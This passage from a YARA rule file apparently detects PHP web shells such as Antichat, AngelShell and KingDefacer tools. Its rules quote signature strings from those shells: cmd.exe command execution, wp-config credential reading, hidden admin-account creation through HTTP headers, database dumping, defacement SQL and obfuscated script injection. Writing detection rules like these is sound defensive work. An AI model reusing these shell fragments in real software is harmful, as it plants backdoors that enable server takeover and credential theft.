      hash25 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash26 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $x1 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x2 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $s3 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\");" fullword ascii
      $s4 = "$encoded = chunk_split(base64_encode(file_get_contents($d.$f)));" fullword ascii
      $s5 = "echo \"<b>Save to file: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_savetofile\\\" value=\\\"1\\\" checked>\";" fullword ascii
      $s6 = "elseif ($ft == \"sdb\") {echo \"<pre>\"; var_dump(unserialize(base64_decode($r))); echo \"</pre>\";}" fullword ascii
      $s7 = "$encoded = base64_encode(file_get_contents($d.$f));" fullword ascii
      $s8 = "if ($fullhexdump) {echo \"<b>FULL HEXDUMP</b>\"; $str = fread($fi,filesize($d.$f));}" fullword ascii
      $s9 = "else {echo \"<b>HEXDUMP PREVIEW</b>\"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}" fullword ascii
      $s10 = "$cfgvars = array(\"dbms\"=>$dbms,\"dbhost\"=>$dbhost,\"dbname\"=>$dbname,\"dbuser\"=>$dbuser,\"dbpasswd\"=>$dbpasswd);" fullword ascii
      $s11 = "$dump_out = \"download\";" fullword ascii
      $s12 = "mysql_query(\"LOAD DATA INFILE \\\"\".addslashes($sql_getfile).\"\\\" INTO TABLE tmp_file\");" fullword ascii
      $s13 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\"\\\";\");" fullword ascii
      $s14 = "$encoded = base64_decode($text);" fullword ascii
      $s15 = "if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}" fullword ascii
      $s16 = "if ($ext == \".tar.gz\") {$cmdline = \"tar cfzv\";}" fullword ascii
      $s17 = "if ($dump_file) {$tmp = $dump_file;}" fullword ascii
      $s18 = "$tmpdb = $sql_login.\"_tmpdb\";" fullword ascii
      $s19 = "if (empty($ret)) {$arcerr .= \"Can't call archivator (\".htmlspecialchars(str2mini($cmdline,60)).\")!<br>\";}" fullword ascii
      $s20 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspecialchars($f)).\"<br>\";}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6544 or uint16(0) == 0x733c or uint16(0) == 0x2a2f or uint16(0) == 0xbbef ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _076a0c97d09cf1a0ec3e19c7f2529f2b_68f376b40de3b68e5c73fd639e784360045d1546_64
{
   meta:
      description = "php17 - from files 076a0c97d09cf1a0ec3e19c7f2529f2b.php, 68f376b40de3b68e5c73fd639e784360045d1546.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da3868f0db6e3d32e471829a0cda86c2185af08c0bf0c93ab37e9a177fb4c5e4"
      hash2 = "c2950aed4d53fa504dec24221ac76f4990a08eca54bb53cfd9eb0a70f589a39c"
   strings:
      $x1 = "/* Get a base64 encoded string wich contains the args to execute */" fullword ascii
      $x2 = "-Execute commands directly as in a terminal-like way (it needs system, passthru or other similar function)" fullword ascii
      $s3 = "/* Process HTTP Request Headers from client */" fullword ascii
      $s4 = "dump(base64_decode($commands[1]));" fullword ascii
      $s5 = "/* include wp-config.php. This allow us to use the credentials directly */" fullword ascii
      $s6 = "-Load wp-config.php (enable direct usage of credentials)" fullword ascii
      $s7 = "@$data = array (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PREFIX);" fullword ascii
      $s8 = "-Password Protected using HTTP headers" fullword ascii
      $s9 = "-Commands are sent by unique HTTP headers" fullword ascii
      $s10 = "$user = get_user_by('login', $login);" fullword ascii
      $s11 = "Returns an array containing user, password, host and db name" fullword ascii
      $s12 = "$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);" fullword ascii
      $s13 = ").\"' and table_name = '\". base64_decode($commands[2]).\"'\", DB_NAME);" fullword ascii
      $s14 = "function process_headers() {" fullword ascii
      $s15 = "process_headers();" fullword ascii
      $s16 = "$source = file_get_contents($wp_config);" fullword ascii
      $s17 = "$check = is_this_allowed(explode(\",\",base64_decode($commands[1])));" fullword ascii
      $s18 = "add_admin(base64_decode($commands[1]), base64_encode($commands[2]));" fullword ascii
      $s19 = "terminal(base64_decode($commands[1]), base64_decode($commands[2]));" fullword ascii
      $s20 = "$users = get_users ('role=administrator');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_0b544ac96e173af11ffee87dee8aad446339801e_1477fa53e5e56605fe001c88831fcb71e30d6e86__65
{
   meta:
      description = "php17 - from files 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 7a7bfc69b9ab20f960e43c8c4faa4bc33825c648.php, 91241fc05105627c2f58942867db10b2b691574e.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash2 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash7 = "6989ebb66bf879f3fa7140e847decc7d3d415f5000bf6759f6e6612726619d6c"
      hash8 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash9 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
   strings:
      $s1 = "fF7eSD8[0]=\"%3Cscript%3E%0Adocu\";" fullword ascii
      $s2 = "fF7eSD8[246]=\"29%253C/script%25\";" fullword ascii
      $s3 = "fF7eSD8[247]=\"3E%22%29%29%3B%0A%3C/scri\";" fullword ascii
      $s4 = "fF7eSD8[191]=\"%255Cu0065%255Cu\";" fullword ascii
      $s5 = "fF7eSD8[156]=\"30%255Cu0036%255Cu\";" fullword ascii
      $s6 = "fF7eSD8[88]=\"05c%255Cu0075%255C\";" fullword ascii
      $s7 = "fF7eSD8[24]=\"72%255Cu0069%25\";" fullword ascii
      $s8 = "fF7eSD8[140]=\"0%255Cu0033%255C\";" fullword ascii
      $s9 = "fF7eSD8[111]=\"%255Cu0075%255Cu\";" fullword ascii
      $s10 = "fF7eSD8[85]=\"5Cu0030%255Cu003\";" fullword ascii
      $s11 = "fF7eSD8[176]=\"Cu005c%255Cu007\";" fullword ascii
      $s12 = "fF7eSD8[234]=\"%255Cu0034%255Cu0\";" fullword ascii
      $s13 = "fF7eSD8[184]=\"5c%255Cu0075%255\";" fullword ascii
      $s14 = "fF7eSD8[79]=\"4%255Cu0033%255Cu\";" fullword ascii
      $s15 = "fF7eSD8[151]=\"Cu0030%255Cu00\";" fullword ascii
      $s16 = "fF7eSD8[227]=\"05c%255Cu0075%25\";" fullword ascii
      $s17 = "fF7eSD8[215]=\"Cu005c%255Cu007\";" fullword ascii
      $s18 = "fF7eSD8[68]=\"0030%255Cu005c%25\";" fullword ascii
      $s19 = "fF7eSD8[83]=\"%255Cu0064%255Cu0\";" fullword ascii
      $s20 = "fF7eSD8[124]=\"u0030%255Cu003\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _03e7d2ebec1e820ac34d054df7e68f48_991d4aa1aca0321d7d3be3dbb323ac7293947fe6_66
{
   meta:
      description = "php17 - from files 03e7d2ebec1e820ac34d054df7e68f48.php, 991d4aa1aca0321d7d3be3dbb323ac7293947fe6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0f6baf256342ba8c30c576c517c5b6e54a2be73b3e3ce218e70998f8f51bc1d"
      hash2 = "471483a8811df5b7150c11ef7045e4f4004cfed5c0238f81b7cd782a2d980ba7"
   strings:
      $x1 = "\\\">lostpassword</a> and <a href = \\\"http://www.d3vilc0de.org\\\">D3vilc0de crew</a> ]</center>\\n</body>\\n</html>\";" fullword ascii
      $x2 = "* PHP Shell scritta da lostpassword, D3vilc0de crew" fullword ascii
      $x3 = "* La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento" fullword ascii
      $s4 = "print \"<td>[ <a class = \\\"head\\\" href = '\" . $c . \"&mode=execute'>Shell Command</a> ]</td>\\n\";" fullword ascii
      $s5 = "print \"Executing the following command:<br />\\n\";" fullword ascii
      $s6 = "print \"<tr>\\n<td><input type = 'submit' value = 'Execute'></td>\\n</tr>\\n</form>\\n</table>\";" fullword ascii
      $s7 = "header ( \"Content-Description: Download manager\" );" fullword ascii
      $s8 = "print \"<table>\\n<form action = '\" . $c . \"&mode=execute' method = 'POST'>\\n\";" fullword ascii
      $s9 = "$ret = shellexec($command);" fullword ascii
      $s10 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir.'&mode=remove&file='.__FILE__);" fullword ascii
      $s11 = "$info .= ((ini_get('magic_quotes_gpc') == 0) ? '[~]Magic Quotes: <font color=\"#00FF33\">OFF</font><br />' : '[~]Magic Quotes:" fullword ascii
      $s12 = "<a href = '\" . $c .\"&mode=rename&old=\" . $out . \"'><img src = 'http://img51.imageshack.us/img51/7241/replyl.gif'" fullword ascii
      $s13 = "function shellexec($cmd) {" fullword ascii
      $s14 = "header ( \"Content-Disposition: attachment; filename=\".$filename.\";\" );" fullword ascii
      $s15 = "print $_POST ['hash'] . \": \" . \"<b>\" . hash ($_POST ['type'], $_POST ['hash']) . \"</b>\";" fullword ascii
      $s16 = "header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$c.'/'.$goto);" fullword ascii
      $s17 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s18 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" seconds | by <a href=\\\"http://lostpassword.hellospace.ne" ascii
      $s19 = "* Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)" fullword ascii
      $s20 = "print \"<table>\\n<form action = '\" . $c . \"&mode=hasher' method = 'POST'>\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3c20 and filesize < 60KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _124e3a5da9aa150c415d084d07fc1d4f_34e62c3cf8e868031704fc28e35a4c5502d8bc8c_67
{
   meta:
      description = "php17 - from files 124e3a5da9aa150c415d084d07fc1d4f.php, 34e62c3cf8e868031704fc28e35a4c5502d8bc8c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "03f61a610163206e9f1467a75b7471146fc6cfd04617d8ba39ca2d415a2cf170"
      hash2 = "0a84fb9a9a1a905ac6a062f9a4a87c081090b50dbd5cbec6733ccb9ac7c322ed"
   strings:
      $s1 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=phpbbdbh v" fullword ascii
      $s2 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=smfdbh val" fullword ascii
      $s3 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=mybbdbh va" fullword ascii
      $s4 = "<center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=dbh value=" fullword ascii
      $s5 = "<title>Lolipop.php - Edited By KingDefacer - [$site]</title></head>\"; " fullword ascii
      $s6 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=dbp size='50' style='font-size: 8pt; co" fullword ascii
      $s7 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=smfdbp size='50' style='font-size: 8pt;" fullword ascii
      $s8 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=phpbbdbp size='50' style='font-size: 8p" fullword ascii
      $s9 = "<font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=mybbdbp size='50' style='font-size: 8pt" fullword ascii
      $s10 = "$loli2 = \"UPDATE template SET template='\".$set_index.\"\".$KingDefacer.\"' WHERE title='FORUMHOME'\"; " fullword ascii
      $s11 = "$loli1 = \"UPDATE template SET template='\".$set_index.\"\".$KingDefacer.\"' WHERE title='spacer_open'\"; " fullword ascii
      $s12 = "yle='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> " fullword ascii
      $s13 = "'color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> " fullword ascii
      $s14 = "$loli7 = \"UPDATE \".$prefix.\"templates SET template='\".$mybb_index.\"' WHERE title='index'\"; " fullword ascii
      $s15 = "$execute = $_POST['execute']; " fullword ascii
      $s16 = "<font face='Verdana' size='1' color='#000000'>Site: <u>$site</u><br>Server name: <u>$sname</u><br>Software: <u>$info</u><br>Vers" ascii
      $s17 = "$site = getenv(\"HTTP_HOST\"); " fullword ascii
      $s18 = "$header = \"From:\".$_POST['header']; " fullword ascii
      $s19 = "<font face='Verdana' size='1' color='#000000'>Site: <u>$site</u><br>Server name: <u>$sname</u><br>Software: <u>$info</u>" fullword ascii
      $s20 = "' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> " fullword ascii
   condition:
      ( uint16(0) == 0x703c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _3926ab64dcf04e87024011cf39902beac32711da_5c029c99477b356a12c0f63ffd8634c87175c6f5_68
{
   meta:
      description = "php17 - from files 3926ab64dcf04e87024011cf39902beac32711da.php, 5c029c99477b356a12c0f63ffd8634c87175c6f5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash2 = "356121bfb217fc572ae7a14db36a168aa97230c2cc5bce2bf2d9a86122b1196b"
   strings:
      $s1 = "output(html_safe(execute($p['terminalInput'])));" fullword ascii
      $s2 = "<input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\\\"trap_enter(event, 'eval_go');\\\">" fullword ascii
      $s3 = "$findExecutable = trim($p['findExecutable']);" fullword ascii
      $s4 = "else $explorer_content = show_all_files(get_cwd());" fullword ascii
      $s5 = "if($findExecutable==\"true\"){" fullword ascii
      $s6 = "header(\"Content-length: \".filesize($file));" fullword ascii
      $s7 = "<tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr>" fullword ascii
      $s8 = "if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();\";" fullword ascii
      $s9 = "$check = strpos(strtolower($content), strtolower($findContent))===false;" fullword ascii
      $s10 = "elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){" fullword ascii
      $s11 = "echo \"data:\".$mime.\";base64,\".base64_encode(read_file($file));" fullword ascii
      $s12 = "if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();\";" fullword ascii
      $s13 = "if(!is_executable($k)) $candidate = array_diff($candidate, array($k));" fullword ascii
      $s14 = "$findContentInsensitive = trim($p['findContentInsensitive']);" fullword ascii
      $s15 = "$p = array_map(\"rawurldecode\", get_post());" fullword ascii
      $s16 = "$GLOBALS['module']['explorer']['content'] = $explorer_content;" fullword ascii
      $s17 = "elseif(isset($p['evalGetSupported'])){" fullword ascii
      $s18 = "elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&isset($p['massValue'])){" fullword ascii
      $s19 = "$findContentRegex = trim($p['findContentRegex']);" fullword ascii
      $s20 = "$check = strpos($content, $findContent)===false;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_091f4d33_69
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 091f4d33fe8f9ccfc76a0976a54396ad.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2008.php, 2009mssql.php, 2011.php, 2011__2_.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "05704ad19226b29711324aaa819d18711c916acb17f9158e3616ad505cb844a6"
      hash5 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash6 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash7 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash8 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash9 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash10 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash11 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash12 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash13 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash14 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash15 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash16 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash17 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash18 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash19 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s4 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s5 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s6 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s7 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s8 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s9 = "makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));" fullword ascii
      $s10 = "p('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirchmod'].'</a> / ');" fullword ascii
      $s11 = "makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));" fullword ascii
      $s12 = "$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');" fullword ascii
      $s13 = "p('<a href=\"javascript:opfile(\\'editfile\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Edit</a> | ');" fullword ascii
      $s14 = "p('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');" fullword ascii
      $s15 = "$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');" fullword ascii
      $s16 = "} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {" fullword ascii
      $s17 = "header(\"content-Type: text/html; charset=iso-8859-2\");" fullword ascii
      $s18 = "maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));" fullword ascii
      $s19 = "if ($execfunc=='wscript' && IS_WIN && IS_COM) {" fullword ascii
      $s20 = "$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _3926ab64dcf04e87024011cf39902beac32711da_47749c211f5a3ad3999629b1403386501fa96048_70
{
   meta:
      description = "php17 - from files 3926ab64dcf04e87024011cf39902beac32711da.php, 47749c211f5a3ad3999629b1403386501fa96048.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash2 = "3b629b45abf98fddf305200e987bacde77db3261a0c4e49cb4d68bafd45f88a4"
   strings:
      $s1 = "if(function_exists('pg_connect')) return @pg_connect(\"$host_str user=$sqluser password=$sqlpass\");" fullword ascii
      $s2 = "elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){" fullword ascii
      $s3 = "elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query));" fullword ascii
      $s4 = "elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); }" fullword ascii
      $s5 = "elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); }" fullword ascii
      $s6 = "elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s7 = "elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s8 = "elseif($type=='oracle') $showdb = \"SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME\";" fullword ascii
      $s9 = "<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>" fullword ascii
      $s10 = "elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); }" fullword ascii
      $s11 = "$query = \"SELECT * FROM \".$db.\".\".$table.\" WHERE ROWNUM BETWEEN \".$start.\" AND \".$limit.\";\";" fullword ascii
      $s12 = "elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = \"SELECT \\\"\".$host.\"\\\"\";" fullword ascii
      $s13 = "if(function_exists(\"mssql_connect\") || function_exists(\"sqlsrv_connect\")) $db_supported[] = 'mssql';" fullword ascii
      $s14 = "elseif($sqltype == 'odbc') return odbc_exec($con, $query);" fullword ascii
      $s15 = "function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){" fullword ascii
      $s16 = "if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s17 = "$query = \"SELECT * FROM \".$db.\".\".$table.\" LIMIT \".$limit.\" OFFSET \".$start.\";\";" fullword ascii
      $s18 = "$res .= \"<p>\".html_safe($query).\";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>\";" fullword ascii
      $s19 = "elseif($type=='pgsql') $showtbl = \"SELECT table_name FROM information_schema.tables WHERE table_schema='\".$db.\"'\";" fullword ascii
      $s20 = "$con = sql_connect($type ,$host , $user , $pass);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _1f1a80153e0fc2ec0b688b66949afb49f1897914_8c5b26f383a4b176a12657b913f35d2a639ea054_antichat_71
{
   meta:
      description = "php17 - from files 1f1a80153e0fc2ec0b688b66949afb49f1897914.php, 8c5b26f383a4b176a12657b913f35d2a639ea054.php, antichat.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
      hash2 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
      hash3 = "6d7af399cf9d9ef4f90454a35ad31bc41884035c8c7a5d12ff924007a698a039"
   strings:
      $x1 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $x2 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $s3 = "$content .=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s4 = "$content .=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s5 = "$content .=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s6 = "$content .=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s7 = "$content .=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s8 = "$content =\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s9 = "$content .=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s10 = "$content .=\"<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>" fullword ascii
      $s11 = "$content .=(!empty($_POST['mysql_l'])?($_POST['mysql_l']):(\"root\"));" fullword ascii
      $s12 = "tbl.value='$str[0]';document.dump2.submit();\\\">$str[0]</a></table>\";" fullword ascii
      $s13 = "$content .=(!empty($_POST['mysql_db'])?($_POST['mysql_db']):(\"mysql\"));" fullword ascii
      $s14 = "$content .=\"<tr><td>Name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>\";" fullword ascii
      $s15 = "; charset=windows-1251\">'.$style.'</head><body leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s16 = "@exec($cmd,$ret);$ret = join(\"\\n\",$ret);" fullword ascii
      $s17 = "ile.value=\\''.$link.'\\'; document.reqs.submit();\" title=\"Delete this file\">X</a></td></tr>';" fullword ascii
      $s18 = "$content .=\"<td>&nbsp;</td><td bgcolor=#44474f><font color=red> $name </font></td> \";" fullword ascii
      $s19 = "t.ru</a> | Made by Grinay | Modified by <s>Go0o$E</s><br/>Last update by <b>Isis</b> |</b></font></center></td></tr></table>" fullword ascii
      $s20 = "<table width=\"100%\" bgcolor=\"#31333b\"  align=\"right\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><tr><td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_5358b9611032c704f509673a35565eca7b36d9bb_a05811ee776c0536a890dba465e501168851df6c_72
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 5358b9611032c704f509673a35565eca7b36d9bb.php, a05811ee776c0536a890dba465e501168851df6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "a5688bae5f2fecfea22bc43d20390dedb375d5f8278faa322be60388cb899a0b"
      hash3 = "bdae76eb77568d3cfe7e58878ce5520d2e3065d4567b7c9d24d193a012637227"
   strings:
      $x1 = "\"findconfig * files\" => \"find / -typef - name\\\"config*\\\"\", \"find config* files in current dir\" => \"find . -type f -na" ascii
      $x2 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
